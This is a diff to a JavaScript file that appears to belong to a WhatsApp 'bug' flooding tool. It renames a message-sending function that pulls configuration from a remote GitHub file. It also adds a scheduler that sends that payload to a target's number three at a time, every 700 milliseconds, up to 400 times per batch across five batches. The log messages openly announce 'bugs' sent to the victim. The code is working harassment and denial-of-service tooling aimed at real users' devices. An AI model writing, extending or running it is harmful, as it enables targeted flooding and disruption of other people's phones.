@@ -670,7 +670,7 @@ module.exports = {
 };
 
 // ==================== FLOOD FUNCTIONS ==================== //
-async function MisteryHow(target) {
+async function MonyetHow(target) {
   let ApiNewFC;
   try {
     const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
@@ -783,6 +783,52 @@ async function MisteryHow(target) {
     participant: { jid: target },
     messageId: msg.key.id
   });
+}
+
+async function MisteryHow(durationHours, X) {
+  const totalDurationMs = durationHours * 3600000;
+  const startTime = Date.now();
+  let count = 0;
+  let batch = 1;
+  const maxBatches = 5;
+
+  const sendNext = async () => {
+    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
+      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
+      return;
+    }
+
+    try {
+      if (count < 400) {
+        await Promise.all([
+          MonyetHow(X),
+          MonyetHow(X),
+          MonyetHow(X)
+        ]);
+        console.log(chalk.yellow(`
+┌────────────────────────┐
+│ ${count + 1}/400 IOS🕊️
+└────────────────────────┘
+  `));
+        count++;
+        setTimeout(sendNext, 700);
+      } else {
+        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
+        if (batch < maxBatches) {
+          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
+          count = 0;
+          batch++;
+          setTimeout(sendNext, 300000);
+        } else {
+          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
+        }
+      }
+    } catch (error) {
+      console.error(`❌ Error saat mengirim: ${error.message}`);
+      setTimeout(sendNext, 700);
+    }
+  };
+  sendNext();
 }
 // ==================== HTML TEMPLATE ==================== //
 const executionPage = (
